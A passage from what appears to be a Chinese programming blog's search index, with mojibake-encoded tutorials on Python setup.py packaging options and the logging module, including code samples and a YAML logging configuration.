ä¸æ‰“åŒ…æŸäº›æ–‡ä»¶</span></span><span class="line">    exclude_package_data=&#123;</span><span class="line">        <span class="hljs-string">&#x27;bandwidth_reporter&#x27;</span>:[<span class="hljs-string">&#x27;*.txt&#x27;</span>]</span><span class="line">                &#125;</span><span class="line">)</span></code></pre></div></div><h3 id="ä¾èµ–åŒ…çš„æè¿°"><a href="#ä¾èµ–åŒ…çš„æè¿°" class="headerlink" title="ä¾èµ–åŒ…çš„æè¿°"></a>ä¾èµ–åŒ…çš„æè¿°</h3><div class="codeBlockContainer"><div class="codeBlockTitle">setup.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">setup(</span><span class="line">    ...</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># è¡¨æ˜å½“å‰æ¨¡å—ä¾èµ–å“ªäº›åŒ…ï¼Œè‹¥ç¯å¢ƒä¸­æ²¡æœ‰ï¼Œåˆ™ä¼šä»pypiä¸­ä¸‹è½½å®‰è£…</span></span><span class="line">    install_requires=[<span class="hljs-string">&#x27;docutils&gt;=0.3&#x27;</span>],</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># setup.py æœ¬èº«è¦ä¾èµ–çš„åŒ…ï¼Œè¿™é€šå¸¸æ˜¯ä¸ºä¸€äº›setuptoolsçš„æ’ä»¶å‡†å¤‡çš„é…ç½®</span></span><span class="line">    <span class="hljs-comment"># è¿™é‡Œåˆ—å‡ºçš„åŒ…ï¼Œä¸ä¼šè‡ªåŠ¨å®‰è£…ã€‚</span></span><span class="line">    setup_requires=[<span class="hljs-string">&#x27;pbr&#x27;</span>],</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># ä»…åœ¨æµ‹è¯•æ—¶éœ€è¦ä½¿ç”¨çš„ä¾èµ–ï¼Œåœ¨æ­£å¸¸å‘å¸ƒçš„ä»£ç ä¸­æ˜¯æ²¡æœ‰ç”¨çš„ã€‚</span></span><span class="line">    <span class="hljs-comment"># åœ¨æ‰§è¡Œpython setup.py testæ—¶ï¼Œå¯ä»¥è‡ªåŠ¨å®‰è£…è¿™ä¸‰ä¸ªåº“ï¼Œç¡®ä¿æµ‹è¯•çš„æ­£å¸¸è¿è¡Œã€‚</span></span><span class="line">    tests_require=[</span><span class="line">        <span class="hljs-string">&#x27;pytest&gt;=3.3.1&#x27;</span>,</span><span class="line">        <span class="hljs-string">&#x27;pytest-cov&gt;=2.5.1&#x27;</span>,</span><span class="line">    ],</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># ç”¨äºå®‰è£…setup_requiresæˆ–tests_requireé‡Œçš„è½¯ä»¶åŒ…</span></span><span class="line">    <span class="hljs-comment"># è¿™äº›ä¿¡æ¯ä¼šå†™å…¥eggçš„ metadata ä¿¡æ¯ä¸­</span></span><span class="line">    dependency_links=[</span><span class="line">        <span class="hljs-string">&quot;http://example2.com/p/foobar-1.0.tar.gz&quot;</span>,</span><span class="line">    ],</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># install_requires åœ¨å®‰è£…æ¨¡å—æ—¶ä¼šè‡ªåŠ¨å®‰è£…ä¾èµ–åŒ…</span></span><span class="line">    <span class="hljs-comment"># è€Œ extras_require ä¸ä¼šï¼Œè¿™é‡Œä»…è¡¨ç¤ºè¯¥æ¨¡å—ä¼šä¾èµ–è¿™äº›åŒ…</span></span><span class="line">    <span class="hljs-comment"># ä½†æ˜¯è¿™äº›åŒ…é€šå¸¸ä¸ä¼šä½¿ç”¨åˆ°ï¼Œåªæœ‰å½“ä½ æ·±åº¦ä½¿ç”¨æ¨¡å—æ—¶ï¼Œæ‰ä¼šç”¨åˆ°ï¼Œè¿™é‡Œéœ€è¦ä½ æ‰‹åŠ¨å®‰è£…</span></span><span class="line">    extras_require=&#123;</span><span class="line">        <span class="hljs-string">&#x27;PDF&#x27;</span>:  [<span class="hljs-string">&quot;ReportLab&gt;=1.2&quot;</span>, <span class="hljs-string">&quot;RXP&quot;</span>],</span><span class="line">        <span class="hljs-string">&#x27;reST&#x27;</span>: [<span class="hljs-string">&quot;docutils&gt;=0.3&quot;</span>],</span><span class="line">    &#125;</span><span class="line">)</span></code></pre></div></div><h3 id="å®‰è£…ç¯å¢ƒçš„é™åˆ¶"><a href="#å®‰è£…ç¯å¢ƒçš„é™åˆ¶" class="headerlink" title="å®‰è£…ç¯å¢ƒçš„é™åˆ¶"></a>å®‰è£…ç¯å¢ƒçš„é™åˆ¶</h3><div class="codeBlockContainer"><div class="codeBlockTitle">setup.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">setup(</span><span class="line">    ...</span><span class="line">    python_requires=<span class="hljs-string">&#x27;&gt;=2.7, &lt;=3&#x27;</span>,</span><span class="line">)</span></code></pre></div></div><h3 id="ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶"><a href="#ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶"></a>ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶</h3><div class="codeBlockContainer"><div class="codeBlockTitle">setup.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> setuptools <span class="hljs-keyword">import</span> setup, find_packages</span><span class="line"></br></span><span class="line"></br></span><span class="line">setup(</span><span class="line">    ...</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># ç”¨æ¥æ”¯æŒè‡ªåŠ¨ç”Ÿæˆè„šæœ¬ï¼Œå®‰è£…åä¼šè‡ªåŠ¨ç”Ÿæˆ /usr/bin/foo çš„å¯æ‰§è¡Œæ–‡ä»¶</span></span><span class="line">    <span class="hljs-comment"># è¯¥æ–‡ä»¶å…¥å£æŒ‡å‘ foo/main.py çš„main å‡½æ•°</span></span><span class="line">    entry_points=&#123;</span><span class="line">        <span class="hljs-string">&#x27;console_scripts&#x27;</span>: [</span><span class="line">            <span class="hljs-string">&#x27;foo = foo.main:main&#x27;</span></span><span class="line">        ]</span><span class="line">    &#125;,</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># å°† bin/foo.sh å’Œ bar.py è„šæœ¬ï¼Œç”Ÿæˆåˆ°ç³»ç»Ÿ PATHä¸­</span></span><span class="line">    <span class="hljs-comment"># æ‰§è¡Œ python setup.py install å</span></span><span class="line">    <span class="hljs-comment"># ä¼šç”Ÿæˆ å¦‚ /usr/bin/foo.sh å’Œ å¦‚ /usr/bin/bar.py</span></span><span class="line">    scripts=[<span class="hljs-string">&#x27;bin/foo.sh&#x27;</span>, <span class="hljs-string">&#x27;bar.py&#x27;</span>]</span><span class="line">)</span></code></pre></div></div><p>å¦‚æœæƒ³å»æ‰è„šæœ¬çš„åç¼€ï¼Œå¯ä»¥è¿™æ ·</p><div class="codeBlockContainer"><div class="codeBlockTitle">setup.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> setuptools.command.install_scripts <span class="hljs-keyword">import</span> install_scripts</span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InstallScripts</span>(<span class="hljs-params">install_scripts</span>):</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        setuptools.command.install_scripts.install_scripts.run(self)</span><span class="line"></br></span><span class="line">        <span class="hljs-comment"># Rename some script files</span></span><span class="line">        <span class="hljs-keyword">for</span> script <span class="hljs-keyword">in</span> self.get_outputs():</span><span class="line">            <span class="hljs-keyword">if</span> basename.endswith(<span class="hljs-string">&quot;.py&quot;</span>) <span class="hljs-keyword">or</span> basename.endswith(<span class="hljs-string">&quot;.sh&quot;</span>):</span><span class="line">                dest = script[:-<span class="hljs-number">3</span>]</span><span class="line">            <span class="hljs-keyword">else</span>:</span><span class="line">                <span class="hljs-keyword">continue</span></span><span class="line">            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;moving %s to %s&quot;</span> % (script, dest))</span><span class="line">            shutil.move(script, dest)</span><span class="line"></br></span><span class="line">setup(</span><span class="line">    ...</span><span class="line">    scripts=[<span class="hljs-string">&#x27;bin/foo.sh&#x27;</span>, <span class="hljs-string">&#x27;bar.py&#x27;</span>],</span><span class="line"></br></span><span class="line">    cmdclass=&#123;</span><span class="line">        <span class="hljs-string">&quot;install_scripts&quot;</span>: InstallScripts</span><span class="line">    &#125;</span><span class="line">)</span></code></pre></div></div><h2 id="ä½¿ç”¨-setup-py-æ„å»ºåŒ…"><a href="#ä½¿ç”¨-setup-py-æ„å»ºåŒ…" class="headerlink" title="ä½¿ç”¨ setup.py æ„å»ºåŒ…"></a>ä½¿ç”¨ setup.py æ„å»ºåŒ…</h2><h3 id="æºç åŒ…"><a href="#æºç åŒ…" class="headerlink" title="æºç åŒ…"></a>æºç åŒ…</h3><p>ä½¿ç”¨<code>python setup.py sdist</code>å‘½ä»¤ï¼Œå°†æºç åŒ…æ‰“åŒ…æˆä¸€ä¸ªtar.gzæ–‡ä»¶ï¼Œå¹¶å­˜æ”¾åœ¨distç›®å½•ä¸­ã€‚</p><p>ä½¿ç”¨<code>easy_install xxx.tar.gz</code>å‘½ä»¤ï¼Œå®‰è£…åŒ…ã€‚</p><h3 id="äºŒè¿›åˆ¶åŒ…"><a href="#äºŒè¿›åˆ¶åŒ…" class="headerlink" title="äºŒè¿›åˆ¶åŒ…"></a>äºŒè¿›åˆ¶åŒ…</h3><p>ä½¿ç”¨<code>python setup.py bdist</code>å‘½ä»¤ï¼Œå°†ç”Ÿæˆå¤šä¸ªæ ¼å¼çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¦‚æœæƒ³å•ç‹¬ç”Ÿæˆä¸€ç§äºŒè¿›åˆ¶æ ¼å¼ï¼š</p><ul><li><code>bdist_wininst</code> windowså®‰è£…ç¨‹åº</li><li><code>bdist_rpm</code> rpmåŒ…</li><li><code>bdist_egg</code> python eggåŒ…</li><li><code>bdist_wheel</code> python wheelåŒ…</li></ul><h3 id="æŒ‡å®šdistæ–‡ä»¶å¤¹çš„ä½ç½®"><a href="#æŒ‡å®šdistæ–‡ä»¶å¤¹çš„ä½ç½®" class="headerlink" title="æŒ‡å®šdistæ–‡ä»¶å¤¹çš„ä½ç½®"></a>æŒ‡å®šdistæ–‡ä»¶å¤¹çš„ä½ç½®</h3><p><code>python setup.py sdist  --dist-dir=[path]</code></p><p>or</p><p><code>-d [path]</code></p><h2 id="ä½¿ç”¨-setup-py-å®‰è£…åŒ…"><a href="#ä½¿ç”¨-setup-py-å®‰è£…åŒ…" class="headerlink" title="ä½¿ç”¨ setup.py å®‰è£…åŒ…"></a>ä½¿ç”¨ setup.py å®‰è£…åŒ…</h2><p>å¤šæ•°æƒ…å†µä½¿ç”¨æ„å»ºåŒ…æˆ–è€…pipè¿›è¡Œå®‰è£…ï¼Œå¦‚æœéœ€è¦æœ¬åœ°å®‰è£…ï¼š</p><ul><li><p><code>python setup.py install</code>å‘½ä»¤å®Œæ•´å®‰è£…ã€‚</p></li><li><p><code>python setup.py develop</code>å‘½ä»¤åˆ›å»ºè½¯è¿æ¥ï¼Œæœ‰å˜åŒ–æ—¶ä¸å¿…é‡å¤å®‰è£…ã€‚</p></li></ul><h2 id="å¦‚ä½•å‘å¸ƒåˆ°-PyPI"><a href="#å¦‚ä½•å‘å¸ƒåˆ°-PyPI" class="headerlink" title="å¦‚ä½•å‘å¸ƒåˆ° PyPI"></a>å¦‚ä½•å‘å¸ƒåˆ° PyPI</h2><p><code>python setup.py sdist upload</code> å‘½ä»¤å‘å¸ƒåˆ° PyPI</p>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python logging æ—¥å¿—æ¨¡å—</title>
      <link href="/2021/12/02/python-logging-%E6%97%A5%E5%BF%97%E6%A8%A1%E5%9D%97/"/>
      <url>/2021/12/02/python-logging-%E6%97%A5%E5%BF%97%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://docs.python.org/zh-cn/3/howto/logging.html#logging-basic-tutorial">æ—¥å¿—å¸¸ç”¨æŒ‡å¼•</a></li></ul><h2 id="æ—¥å¿—çº§åˆ«"><a href="#æ—¥å¿—çº§åˆ«" class="headerlink" title="æ—¥å¿—çº§åˆ«"></a>æ—¥å¿—çº§åˆ«</h2><table><thead><tr><th align="center">çº§åˆ«</th><th align="center">ä½•æ—¶ä½¿ç”¨</th></tr></thead><tbody><tr><td align="center">DEBUG</td><td align="center">ç»†èŠ‚ä¿¡æ¯ï¼Œä»…å½“è¯Šæ–­é—®é¢˜æ—¶é€‚ç”¨ã€‚</td></tr><tr><td align="center">INFO</td><td align="center">ç¡®è®¤ç¨‹åºæŒ‰é¢„æœŸè¿è¡Œã€‚</td></tr><tr><td align="center">WARNING</td><td align="center">è¡¨æ˜æœ‰å·²ç»æˆ–å³å°†å‘ç”Ÿçš„æ„å¤–ï¼ˆä¾‹å¦‚ï¼šç£ç›˜ç©ºé—´ä¸è¶³ï¼‰ã€‚ç¨‹åºä»æŒ‰é¢„æœŸè¿›è¡Œã€‚</td></tr><tr><td align="center">ERROR</td><td align="center">ç”±äºä¸¥é‡çš„é—®é¢˜ï¼Œç¨‹åºçš„æŸäº›åŠŸèƒ½å·²ç»ä¸èƒ½æ­£å¸¸æ‰§è¡Œ</td></tr><tr><td align="center">CRITICAL</td><td align="center">ä¸¥é‡çš„é”™è¯¯ï¼Œè¡¨æ˜ç¨‹åºå·²ä¸èƒ½ç»§ç»­æ‰§è¡Œ</td></tr></tbody></table><h2 id="åˆçº§ä½¿ç”¨"><a href="#åˆçº§ä½¿ç”¨" class="headerlink" title="åˆçº§ä½¿ç”¨"></a>åˆçº§ä½¿ç”¨</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> logging</span><span class="line">logging.warning(<span class="hljs-string">&#x27;Watch out!&#x27;</span>)  <span class="hljs-comment"># will print a message to the console</span></span><span class="line">logging.info(<span class="hljs-string">&#x27;I told you so&#x27;</span>)  <span class="hljs-comment"># will not print anything</span></span></code></pre></div></div><p>è®°å½•åˆ°æ–‡ä»¶</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> logging</span><span class="line">logging.basicConfig(filename=<span class="hljs-string">&#x27;example.log&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>, level=logging.DEBUG)</span><span class="line">logging.debug(<span class="hljs-string">&#x27;This message should go to the log file&#x27;</span>)</span><span class="line">logging.info(<span class="hljs-string">&#x27;So should this&#x27;</span>)</span><span class="line">logging.warning(<span class="hljs-string">&#x27;And this, too&#x27;</span>)</span><span class="line">logging.error(<span class="hljs-string">&#x27;very bad&#x27;</span>)</span></code></pre></div></div><h2 id="loggingçš„ç»„ä»¶"><a href="#loggingçš„ç»„ä»¶" class="headerlink" title="loggingçš„ç»„ä»¶"></a>loggingçš„ç»„ä»¶</h2><p>loggingé‡‡ç”¨ç»„ä»¶çš„æ–¹å¼ç»„åˆä½¿ç”¨</p><p>logging æ¨¡å—çš„å››å¤§ç»„ä»¶</p><table><thead><tr><th align="center">ç»„ä»¶</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">loggers</td><td align="center">æä¾›åº”ç”¨ç¨‹åºä»£ç ç›´æ¥ä½¿ç”¨çš„æ¥å£</td></tr><tr><td align="center">handlers</td><td align="center">å¤„ç†å™¨å°†æ—¥å¿—è®°å½•ï¼ˆç”±è®°å½•å™¨åˆ›å»ºï¼‰å‘é€åˆ°é€‚å½“çš„ç›®æ ‡ã€‚</td></tr><tr><td align="center">filters</td><td align="center">è¿‡æ»¤å™¨æä¾›äº†æ›´ç»†ç²’åº¦çš„åŠŸèƒ½ï¼Œç”¨äºç¡®å®šè¦è¾“å‡ºçš„æ—¥å¿—è®°å½•ã€‚</td></tr><tr><td align="center">formatters</td><td align="center">ç”¨äºæ§åˆ¶æ—¥å¿—ä¿¡æ¯çš„æœ€ç»ˆè¾“å‡ºæ ¼å¼</td></tr></tbody></table><h3 id="è®°å½•å™¨-logger"><a href="#è®°å½•å™¨-logger" class="headerlink" title="è®°å½•å™¨ logger"></a>è®°å½•å™¨ logger</h3><p>è®°å½•å™¨çš„ä¸‰ä¸ªä»»åŠ¡</p><ol><li>è®°å½•å™¨å¯¹ç¨‹åºå…¬å¼€äº†å‡ ä¸ªæ¥å£ï¼Œå¯ä»¥ç”¨äºè®°å½•æ—¥å¿—ä¿¡æ¯</li><li>æ ¹æ®ä¸¥é‡ç¨‹åº¦æˆ–è€…è¿‡æ»¤å™¨ç¡®å®šæ˜¯å¦è®°å½•æ—¥å¿—</li><li>å°†è®°å½•çš„æ—¥å¿—å‘é€ç»™å¤„ç†å™¨handler</li></ol><p>å¸¸ç”¨çš„æ¥å£:</p><ul><li><code>Logger.getLogger()</code></li><li><code>Logger.setLevel()</code></li><li><code>Logger.addHandler()</code> ä¸ <code>Logger.removeHandler()</code></li><li><code>Logger.addFilter()</code> ä¸ <code>Logger.removeFilter()</code></li></ul><p>ä»¥åŠè®°å½•æ—¥å¿—ä¿¡æ¯æ–¹æ³•ï¼š</p><ul><li><code>Logger.debug()</code></li><li><code>Logger.info()</code></li><li><code>Logger.warning()</code></li><li><code>Logger.error()</code></li><li><code>Logger.exception()</code></li></ul><p>å…¶ä¸­<code>Logger.exception()</code>å’Œ<code>Logger.error()</code>çš„åŒºåˆ«æ˜¯ï¼Œå‰è€…ä¼šè‡ªåŠ¨è®°å½•å¼‚å¸¸ä¿¡æ¯ï¼Œåè€…ä¸ä¼šã€‚</p><p>åœ¨å‘½åè®°å½•å™¨æ—¶ä½¿ç”¨çš„ä¸€ä¸ªå¥½ä¹ æƒ¯æ˜¯åœ¨æ¯ä¸ªä½¿ç”¨æ—¥å¿—è®°å½•çš„æ¨¡å—ä¸­ä½¿ç”¨æ¨¡å—çº§è®°å½•å™¨ï¼Œå‘½åå¦‚ä¸‹:</p><p><code>Logger.getLogger(__name__)</code></p><p>å¤šæ¬¡è°ƒç”¨<code>getLogger()</code>å…·æœ‰ç›¸åŒçš„åç§°å°†è¿”å›å¯¹åŒä¸€è®°å½•å™¨å¯¹è±¡çš„å¼•ç”¨ã€‚</p><h3 id="å¤„ç†å™¨-handler"><a href="#å¤„ç†å™¨-handler" class="headerlink" title="å¤„ç†å™¨ handler"></a>å¤„ç†å™¨ handler</h3><p>hanlderå°†é€‚å½“çš„ï¼ˆæ ¹æ®æ—¥å¿—æ¶ˆæ¯çš„ä¸¥é‡æ€§ï¼‰æ—¥å¿—è®°å½•å‘é€çš„æŒ‡å®šçš„ç›®æ ‡ã€‚</p><blockquote><p>ä½œä¸ºç¤ºä¾‹åœºæ™¯ï¼Œåº”ç”¨ç¨‹åºå¯èƒ½å¸Œæœ›å°†æ‰€æœ‰æ—¥å¿—æ¶ˆæ¯å‘é€åˆ°æ—¥å¿—æ–‡ä»¶ï¼Œå°†é”™è¯¯æˆ–æ›´é«˜çš„æ‰€æœ‰æ—¥å¿—æ¶ˆæ¯å‘é€åˆ°æ ‡å‡†è¾“å‡ºï¼Œä»¥åŠå°†æ‰€æœ‰å…³é”®æ¶ˆæ¯å‘é€è‡³ä¸€ä¸ªé‚®ä»¶åœ°å€ã€‚ æ­¤æ–¹æ¡ˆéœ€è¦ä¸‰ä¸ªå•ç‹¬çš„å¤„ç†å™¨ï¼Œå…¶ä¸­æ¯ä¸ªå¤„ç†å™¨è´Ÿè´£å°†ç‰¹å®šä¸¥é‡æ€§çš„æ¶ˆæ¯å‘é€åˆ°ç‰¹å®šä½ç½®ã€‚</p></blockquote><p>æ ‡å‡†åº“ä¸­åŒ…å«å¾ˆå¤šå¤„ç†å™¨ï¼Œå¸¸ç”¨çš„æœ‰<code>StreamHandler</code>å’Œ<code>FileHandler</code>ã€‚æ›´å¤šçš„å¤„ç†å™¨å¯ä»¥åœ¨<a href="https://docs.python.org/zh-cn/3/howto/logging.html#useful-handlers">è¿™é‡Œ</a>æ‰¾åˆ°ã€‚</p><p>å¸¸ç”¨çš„æ¥å£ï¼š</p><ul><li><code>Handler.setLevel()</code> å’Œ <code>Logger.setLevel()</code>ä¸åŒï¼Œ<code>Logger</code>çš„æ˜¯å‘é€ç»™Handlerçš„æœ€ä½ä¸¥é‡æ€§ï¼Œè€Œ<code>Hander</code>çš„æ˜¯å‘é€ç»™ç›®æ ‡çš„æœ€ä½ä¸¥é‡æ€§ã€‚</li><li><code>Handler.setFormatter()</code></li><li><code>Handler.addFilter()</code> ä¸ <code>Handler.removeFilter()</code></li></ul><h3 id="æ ¼å¼å™¨-formatter"><a href="#æ ¼å¼å™¨-formatter" class="headerlink" title="æ ¼å¼å™¨ formatter"></a>æ ¼å¼å™¨ formatter</h3><p>æ ‡å‡†æ ¼å¼å¦‚ä¸‹:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">logging.Formatter.__init__(fmt=<span class="hljs-literal">None</span>, datefmt=<span class="hljs-literal">None</span>, style=<span class="hljs-string">&#x27;%&#x27;</span>)</span></code></pre></div></div><p>ä¸‰ä¸ªå¯é€‰é¡¹åˆ†åˆ«æ˜¯<code>æ¶ˆæ¯æ ¼å¼å­—ç¬¦ä¸²</code>ã€<code>æ—¥æœŸæ ¼å¼å­—ç¬¦ä¸²</code>å’Œ<code>æ ·å¼æŒ‡ç¤ºç¬¦</code>ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">fmt=<span class="hljs-string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span></span></code></pre></div></div><h2 id="é…ç½®æ—¥å¿—è®°å½•"><a href="#é…ç½®æ—¥å¿—è®°å½•" class="headerlink" title="é…ç½®æ—¥å¿—è®°å½•"></a>é…ç½®æ—¥å¿—è®°å½•</h2><h3 id="ä»£ç é…ç½®æ—¥å¿—è®°å½•"><a href="#ä»£ç é…ç½®æ—¥å¿—è®°å½•" class="headerlink" title="ä»£ç é…ç½®æ—¥å¿—è®°å½•"></a>ä»£ç é…ç½®æ—¥å¿—è®°å½•</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> logging</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># create logger</span></span><span class="line">logger = logging.getLogger(<span class="hljs-string">&#x27;simple_example&#x27;</span>)</span><span class="line">logger.setLevel(logging.DEBUG)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># create console handler and set level to debug</span></span><span class="line">ch = logging.StreamHandler()</span><span class="line">ch.setLevel(logging.DEBUG)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># create formatter</span></span><span class="line">formatter = logging.Formatter(<span class="hljs-string">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># add formatter to ch</span></span><span class="line">ch.setFormatter(formatter)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># add ch to logger</span></span><span class="line">logger.addHandler(ch)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># &#x27;application&#x27; code</span></span><span class="line">logger.debug(<span class="hljs-string">&#x27;debug message&#x27;</span>)</span><span class="line">logger.info(<span class="hljs-string">&#x27;info message&#x27;</span>)</span><span class="line">logger.warning(<span class="hljs-string">&#x27;warn message&#x27;</span>)</span><span class="line">logger.error(<span class="hljs-string">&#x27;error message&#x27;</span>)</span><span class="line">logger.critical(<span class="hljs-string">&#x27;critical message&#x27;</span>)</span></code></pre></div></div><h3 id="yamlé…ç½®æ—¥å¿—è®°å½•"><a href="#yamlé…ç½®æ—¥å¿—è®°å½•" class="headerlink" title="yamlé…ç½®æ—¥å¿—è®°å½•"></a>yamlé…ç½®æ—¥å¿—è®°å½•</h3><div class="codeBlockContainer"><div class="codeBlockTitle">log.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> logging</span><span class="line"><span class="hljs-keyword">import</span> logging.config</span><span class="line"><span class="hljs-keyword">import</span> yaml</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">from</span> lib.data.data <span class="hljs-keyword">import</span> pystr</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">setup_logger</span>() -&gt; logging.Logger:</span></span><span class="line">    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;logconf.yaml&#x27;</span>) <span class="hljs-keyword">as</span> f:</span><span class="line">        config = yaml.safe_load(f.read())</span><span class="line">        logging.config.dictConfig(config)</span><span class="line">        logger = logging.getLogger(<span class="hljs-string">&#x27;simpleExample&#x27;</span>)</span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">return</span> logger</span><span class="line"></br></span><span class="line">logger = setup_logger()</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockTitle">logging.yaml</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-yaml codeBlockLines"><span class="line"><span class="hljs-attr">version:</span> <span class="hljs-number">1</span></span><span class="line"><span class="hljs-attr">formatters:</span></span><span class="line">  <span class="hljs-attr">simple:</span></span><span class="line">    <span class="hljs-attr">format:</span> <span class="hljs-string">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span></span><span class="line"><span class="hljs-attr">handlers:</span></span><span class="line">  <span class="hljs-attr">console:</span></span><span class="line">    <span class="hljs-attr">class:</span> <span class="hljs-string">logging.StreamHandler</span></span><span class="line">    <span class="hljs-attr">level:</span> <span class="hljs-string">INFO</span></span><span class="line">    <span class="hljs-attr">formatter:</span> <span class="hljs-string">simple</span></span><span class="line">    <span class="hljs-attr">stream:</span> <span class="hljs-string">ext://sys.stdout</span></span><span class="line">  <span class="hljs-attr">debug_file_handler:</span></span><span class="line">    <span class="hljs-attr">class:</span> <span class="hljs-string">logging.handlers.RotatingFileHandler</span></span><span class="line">    <span class="hljs-attr">level:</span> <span class="hljs-string">DEBUG</span></span><span class="line">    <span class="hljs-attr">formatter:</span> <span class="hljs-string">simple</span></span><span class="line">    <span class="hljs-attr">filename:</span> <span class="hljs-string">./log/debug.log</span></span><span class="line">    <span class="hljs-attr">maxBytes:</span> <span class="hljs-number">10485760</span> <span class="hljs-comment"># 10MB</span></span><span class="line">    <span class="hljs-attr">backupCount:</span> <span class="hljs-number">20</span></span><span class="line"><span class="hljs-attr">error_file_handler:</span></span><span class="line">    <span class="hljs-attr">class:</span> <span class="hljs-string">logging.handlers.RotatingFileHandler</span></span><span class="line">    <span class="hljs-attr">level:</span> <span class="hljs-string">ERROR</span></span><span class="line">    <span class="hljs-attr">formatter:</span> <span class="hljs-string">simple</span></span><span class="line">    <span class="hljs-attr">filename:</span> <span class="hljs-string">./log/error.log</span></span><span class="line">    <span class="hljs-attr">maxBytes:</span> <span class="hljs-number">10485760</span> <span class="hljs-comment"># 10MB</span></span><span class="line">    <span class="hljs-attr">backupCount:</span> <span class="hljs-number">20</span></span><span class="line">    <span class="hljs-attr">encoding:</span> <span class="hljs-string">utf8</span></span><span class="line"><span class="hljs-attr">loggers:</span></span><span class="line">  <span class="hljs-attr">pyaio:</span></span><span class="line">    <span class="hljs-attr">level:</span> <span class="hljs-string">DEBUG</span></span><span class="line">    <span class="hljs-attr">handlers:</span> [<span class="hljs-string">console</span>, <span class="hljs-string">debug_file_handler</span>, <span class="hljs-string">error_file_handler</span>]</span><span class="line">    <span class="hljs-attr">propagate:</span> <span class="hljs-literal">no</span></span><span class="line"><span class="hljs-attr">root:</span></span><span class="line">  <span class="hljs-attr">level:</span> <span class="hljs-string">DEBUG</span></span><span class="line">  <span class="hljs-attr">handlers:</span> [<span class="hljs-string">console</span>]   <span class="hljs-attr">encoding:</span> <span class="hljs-string">utf8</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python sqlalchemy ä½¿ç”¨Dictå­—æ®µ</title>
      <link href="/2021/11/18/python-sqlalchemy-%E4%BD%BF%E7%94%A8Dict%E5%AD%97%E6%AE%B5/"/>
      <url>/2021/11/18/python-sqlalchemy-%E4%BD%BF%E7%94%A8Dict%E5%AD%97%E6%AE%B5/</url>
      
